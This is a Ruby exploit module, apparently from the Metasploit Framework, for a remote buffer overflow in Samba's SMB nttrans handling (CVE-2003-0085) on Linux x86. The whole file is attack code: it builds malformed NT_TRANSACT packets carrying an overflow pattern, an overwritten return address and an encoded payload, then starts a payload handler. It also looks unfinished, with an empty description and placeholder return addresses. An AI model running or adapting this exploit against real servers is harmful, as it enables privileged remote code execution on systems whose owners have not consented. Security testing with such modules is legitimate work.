##
# $Id:$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##


require 'msf/core'

module Msf

class Exploits::Multi::Samba::NTTrans_Overflow < Msf::Exploit::Remote

	include Exploit::Remote::SMB

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Samba nttrans Overflow',
			'Description'    => %q{
				
			},
			'Author'         => [ 'hdm' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'BID', '7106' ],
					[ 'CVE', '2003-0085' ],
				],
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 1024,
					'BadChars' => "\x00",
					'MinNops'  => 512,
				},
			'Targets'        => 
				[
					["Samba 2.2.x Linux x86",  
						{
							'Arch' => ARCH_X86,
							'Platform' => 'linux',
							'Rets' => [0x01020304, 0x41424344],
						},
					],
				],
			'DisclosureDate' => 'Apr 7 2003'
			))
			
			register_options(
				[
					Opt::RPORT(139)
				], self.class)
					
	end

	def exploit
		
		# 0x081fc968
		
		pattern = Rex::Text.pattern_create(12000)
	
		pattern[532, 4] = [0x81b847c].pack('V')
		pattern[836, payload.encoded.length] = payload.encoded

	#	0x081b8138


		connect
		smb_login

		targ_address = 0xfffbb7d0	
		
		#
		# Send a NTTrans request with ParameterCountTotal set to the buffer length
		#

		subcommand   = 1
		param        = ''
		body         = ''
		setup_count  = 0
		setup_data   = ''
		data = param + body

		pkt = CONST::SMB_NTTRANS_PKT.make_struct
		self.simple.client.smb_defaults(pkt['Payload']['SMB'])
		
		base_offset = pkt.to_s.length + (setup_count * 2) - 4
		param_offset = base_offset
		data_offset = param_offset + param.length
		
		pkt['Payload']['SMB'].v['Command'] = CONST::SMB_COM_NT_TRANSACT
		pkt['Payload']['SMB'].v['Flags1'] = 0x18
		pkt['Payload']['SMB'].v['Flags2'] = 0x2001
		pkt['Payload']['SMB'].v['WordCount'] = 19 + setup_count
		
		pkt['Payload'].v['ParamCountTotal'] =12000
		pkt['Payload'].v['DataCountTotal'] = body.length
		pkt['Payload'].v['ParamCountMax'] = 1024
		pkt['Payload'].v['DataCountMax'] = 65504
		pkt['Payload'].v['ParamCount'] = param.length
		pkt['Payload'].v['ParamOffset'] = param_offset
		pkt['Payload'].v['DataCount'] = body.length
		pkt['Payload'].v['DataOffset'] = data_offset
		pkt['Payload'].v['SetupCount'] = setup_count
		pkt['Payload'].v['SetupData'] = setup_data
		pkt['Payload'].v['Subcommand'] = subcommand
				
		pkt['Payload'].v['Payload'] = data
		
		self.simple.client.smb_send(pkt.to_s)
		ack = self.simple.client.smb_recv_parse(CONST::SMB_COM_NT_TRANSACT)
		
		#
		# Send a NTTrans secondary request with the magic displacement
		#

		param = pattern
		body  = ''
		data  = param + body

		pkt = CONST::SMB_NTTRANS_SECONDARY_PKT.make_struct
		self.simple.client.smb_defaults(pkt['Payload']['SMB'])
		
		base_offset = pkt.to_s.length - 4
		param_offset = base_offset
		data_offset = param_offset + param.length
		
		pkt['Payload']['SMB'].v['Command'] = CONST::SMB_COM_NT_TRANSACT_SECONDARY
		pkt['Payload']['SMB'].v['Flags1'] = 0x18
		pkt['Payload']['SMB'].v['Flags2'] = 0x2001
		pkt['Payload']['SMB'].v['WordCount'] = 18
		
		pkt['Payload'].v['ParamCountTotal'] = param.length
		pkt['Payload'].v['DataCountTotal'] = body.length
		pkt['Payload'].v['ParamCount'] = param.length
		pkt['Payload'].v['ParamOffset'] = param_offset
		pkt['Payload'].v['ParamDisplace'] = targ_address
		pkt['Payload'].v['DataCount'] = body.length
		pkt['Payload'].v['DataOffset'] = data_offset
				
		pkt['Payload'].v['Payload'] = data
		
		self.simple.client.smb_send(pkt.to_s)
		ack = self.simple.client.smb_recv_parse(CONST::SMB_COM_NT_TRANSACT_SECONDARY)


		handler

	end

end
end	
